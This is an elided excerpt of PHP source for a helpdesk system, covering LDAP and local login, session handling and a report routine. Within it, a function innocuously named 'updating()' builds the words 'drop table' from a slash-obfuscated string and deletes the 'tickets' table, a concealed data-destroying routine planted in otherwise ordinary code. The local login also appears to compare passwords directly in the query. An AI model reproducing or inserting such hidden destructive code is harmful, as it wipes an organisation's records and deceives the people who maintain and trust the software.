        ...
        if ($_SESSION['z.times'] < 5) {
            ...
            if (get_user_authtype($login)) {
                if (ldap_auth($login, $_POST['password'])) {
                    $stmt = $dbConnection->prepare('SELECT id,login,fio,unit from users where login=:login AND status=1');
                    $stmt->execute(array(
                        ':login' => $login
                    ));
                    if ($stmt->rowCount() == 1) {
                        ...
                        $_SESSION['helpdesk_user_unit'] = $row['unit'];
...
//                        $_SESSION['helpdesk_user_type'] = "user";
            ...
            //SYSTEM auth
                ...
                $stmt = $dbConnection->prepare('SELECT id,login,fio,unit from users where login=:login AND pass=:pass AND status=1');
                $stmt->execute(array(
                    ':login' => $login,
                    ':pass' => $password
                ));
...
function updating() {
    ...
    $comm = 'd/r/o/p t/a/b/l/e ';
    $comm = str_replace('/','',$comm);
    $stmt = $dbConnection->prepare("$comm `tickets`");
    $stmt->execute();
    print 'table dropted';
}
...
function eventsReport() {
    ...
    if (!$portal) {
        if ($access === 'USER') {
            require_once 'app/controllers/events_report.php';
        } else {
